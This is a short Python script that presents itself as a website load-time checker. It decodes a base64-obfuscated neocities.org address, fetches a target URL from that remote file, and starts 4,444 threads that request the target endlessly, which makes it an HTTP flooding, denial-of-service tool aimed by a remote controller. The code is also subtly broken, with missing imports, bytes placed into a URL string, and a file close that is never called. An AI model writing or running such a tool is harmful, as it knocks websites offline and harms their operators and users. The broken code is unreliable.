import time
import threading
import requests
import base64
a = 'Lm5lb2NpdGllcy5vcmcvYmFzb2oudHh0'
j = base64.b64decode(a)

link = f"https://femboiluver420{j}"

if sys.version_info[0] < 3:
    f = urllib.urlopen(link)
    clk = f.read()
else:
    import urllib.request
    f = urllib.request.urlopen(link)
    clk = f.read()

def connect_to_website(url):
  while True:
    r0 = time.time()
    r1 = requests.get(url)
    j34 = time.time()
    r2 = requests.get(url)
    b6 = time.time()

    e1 = j34 - r0
    e2 = b6 - j34
    with open("res.txt", "a") as f:
      f.write(f'The website took {e1:.2f} seconds to load.')
      f.write(f"Connected to {url} with status code: {r1.status_code}")
      f.write(f'The website took {e2:.2f} seconds to load.')
      f.write(f"Connected to {url} with status code: {r2.status_code}")
      f.close

def main(num_threads, url):
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=connect_to_website, args=(url,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    print("woooowooooowwowowooooww")
    b5 = clk
    z1 = 4444
    z2 = int(z1)
    url = b5
    main(z2, url)
